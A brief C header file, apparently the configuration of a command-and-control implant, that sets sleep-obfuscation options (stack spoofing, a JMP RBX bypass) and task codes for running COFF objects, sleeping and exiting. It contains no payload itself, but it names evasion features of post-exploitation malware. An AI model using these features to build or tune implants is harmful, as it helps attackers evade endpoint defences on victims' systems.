#ifndef CONFIG_H
#define CONFIG_H

#include <Common.h>


#define INSTANCE_HEAP_MAGIC 0x41424344
// #define SLEEPOBF_FLOW
// #define SLEEPOBF_ZERO_OLD_REGION
#define SLEEPOBF_SPOOF
#define SLEEPOBF_BYPASS SLEEPOBF_BYPASS_JMPRBX

#define TASK_COFF 1
#define TASK_SLEEP 2
#define TASK_EXIT 3

#endif
